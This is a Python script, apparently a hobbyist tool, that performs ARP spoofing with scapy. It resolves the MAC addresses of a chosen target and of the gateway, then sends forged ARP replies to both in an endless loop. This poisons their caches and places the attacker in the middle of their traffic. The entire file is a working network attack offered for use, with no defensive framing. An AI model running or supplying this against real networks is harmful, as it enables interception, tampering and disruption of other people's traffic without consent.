import scapy.all as scapy
import ipaddress
from colorama import Fore, Back, Style

#Function to check if the ip address input is valid
def valid_ip_address(ip_address):
    try:
        ip = ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

#With ARP get the target MAC address
def get_MAC(target_ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_ip)
    reply, _ = scapy.srp(arp_request,timeout=3,verbose=0)
    if reply:
        return reply[0][1].src
    return None

#Create and send fake packs to traget
def spoof(target_ip,target_mac,spoof_ip):
    spoofed_arp_packet = scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=spoof_ip, op="is-at")
    scapy.send(spoofed_arp_packet, verbose=0)


def main():
    #IP input to spoof
    target_ip = input("Enter target-ip: ")
    valid_ip_target = valid_ip_address(target_ip)
    getway_ip = input("Enter getway-ip: ")
    valid_ip_getway = valid_ip_address(getway_ip)

    #Check IP validation
    if valid_ip_target is False or valid_ip_getway is False:
        print(Fore.RED+"IP validation test failed")
        return None
    
    #Search for the MAC address of the trget
    target_mac,getway_mac = None,None
    print(Fore.YELLOW+"Searching for the MAC address...")
    while not target_mac and not getway_mac:
        target_mac = get_MAC(target_ip)
        getway_mac = get_MAC(getway_ip)

    #Logs for terminal
    print(Fore.GREEN+"MAC address was found!")
    print(Fore.YELLOW+"The MAC (traget) adress is: {}".format(target_mac))
    print(Fore.YELLOW+"The MAC (getway) adress is: {}".format(getway_mac))
    print(Fore.BLUE+"spoofer is active!")

    #Start the spoof function in endless loop
    try:
        while True:
            spoof(target_ip,target_mac,getway_ip)
            spoof(getway_ip,getway_mac,target_ip)
    #Stop spoofing by pressing Ctrl+C
    except KeyboardInterrupt:
        print(Fore.BLUE+"spoofing finished.")
        
    Fore.RESET

if __name__=="__main__":
    main()